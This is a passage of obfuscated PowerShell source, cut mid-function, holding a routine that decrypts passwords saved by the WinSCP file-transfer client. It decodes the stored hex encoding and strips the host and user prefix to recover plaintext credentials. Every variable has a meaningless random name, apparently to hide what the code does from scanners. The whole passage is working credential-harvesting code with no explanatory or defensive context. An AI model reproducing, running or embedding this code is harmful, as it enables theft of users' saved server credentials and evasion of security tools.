  $PhobicWave.remainingPass = $DoubleNoise.Substring(2)

  return $PhobicWave

}

function DecryptWinSCPPassword($FuzzyTested, $StiffDry, $PastShake) {

  $SpringAbject = 255
  $NeedleZip = 163

  $HeadyWarn = 0
  $FuelSudden =  $FuzzyTested + $StiffDry
  $VeilFlower = DecryptNextCharacterWinSCP($PastShake)

  $BrickMisty = $VeilFlower.flag 

  if ($VeilFlower.flag -eq $SpringAbject) {
    $VeilFlower.remainingPass = $VeilFlower.remainingPass.Substring(2)
    $VeilFlower = DecryptNextCharacterWinSCP($VeilFlower.remainingPass)
  }

  $HeadyWarn = $VeilFlower.flag

  $VeilFlower = DecryptNextCharacterWinSCP($VeilFlower.remainingPass)
  $VeilFlower.remainingPass = $VeilFlower.remainingPass.Substring(($VeilFlower.flag * 2))

  $MendWord = ""
  for ($ChiefQuick=0; $ChiefQuick -lt $HeadyWarn; $ChiefQuick++) {
    $VeilFlower = (DecryptNextCharacterWinSCP($VeilFlower.remainingPass))
    $MendWord += [char]$VeilFlower.flag
  }

  if ($BrickMisty -eq $SpringAbject) {
    return $MendWord.Substring($FuelSudden.length)
  }

  return $MendWord

}
